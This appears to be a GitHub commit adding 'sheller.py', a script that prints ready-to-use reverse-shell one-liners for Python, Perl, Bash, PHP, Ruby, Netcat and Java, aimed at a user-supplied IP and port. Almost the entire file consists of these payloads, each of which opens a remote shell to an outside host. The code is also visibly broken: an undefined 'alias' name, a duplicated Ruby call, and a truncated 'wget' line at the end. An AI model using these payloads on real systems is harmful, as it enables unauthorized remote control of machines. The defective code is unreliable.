c3860adb032f2243c1906a734ef9b05e347e7f31
Ak <44728139+Ak-wa@users.noreply.github.com>
2019-08-19 14:01:23 +0200

    Create sheller.py

---
+++ sheller.py
@@ -0,0 +1,56 @@
+#!/usr/bin/python3
+from os import system
+import argparse
+parser = argparse.ArgumentParser()
+parser.add_argument('-d', help="IP address to connect to", dest="ip", required=False)
+parser.add_argument('-p', help="Port to connect to", dest="port", required=False)
+parser.add_argument('-alias',dest=alias,help="Installs Sheller on your system with an alias",action="store_true",required=False)
+args = parser.parse_args()
+def py(ip, port):
+    print("[+] Python")
+    payload = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (ip, port)
+    print(payload,"\n")
+def pl(ip, port):
+    print("[+] Perl")
+    payload = """perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (ip, port)
+    print(payload,"\n")
+def sh(ip, port):
+    print("[+] Bash")
+    payload = """bash -i >& /dev/tcp/%s/%d 0>&1""" % (ip, port)
+    print(payload,"\n")
+def php(ip, port):
+    print("[+] PHP")
+    payload = """php -r '$sock=fsockopen(%s,%d);exec("/bin/sh -i <&3 >&3 2>&3");'""" % (ip, port)
+    print(payload,"\n")
+def rb(ip, port):
+    print("[+] Ruby")
+    payload = """ruby -rsocket -e'f=TCPSocket.open({},{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""".format(ip, port)
+    print(payload,"\n")
+def nc(ip, port):
+    print("[+] Netcat")
+    payload = "nc -e /bin/sh %s %d" % (ip, port)
+    print(payload,"\n")
+def java(ip, port):
+    print("[+] Java")
+    payload = """r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()""" % (ip, port)
+    print(payload,"\n")
+    
+def show_ips():
+    print("[+] IPs you may want to use: ")
+    system("""ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'""")
+
+if args.ip:
+    if args.port:
+        py(args.ip,int(args.port))
+        pl(args.ip,int(args.port))
+        sh(args.ip,int(args.port))
+        php(args.ip,int(args.port))
+        rb(args.ip,int(args.port))
+        rb(args.ip,int(args.port))
+        nc(args.ip,int(args.port))
+        java(args.ip,int(args.port))
+    else:
+        if args.alias:
+            system('wget 
+else:
+    pass
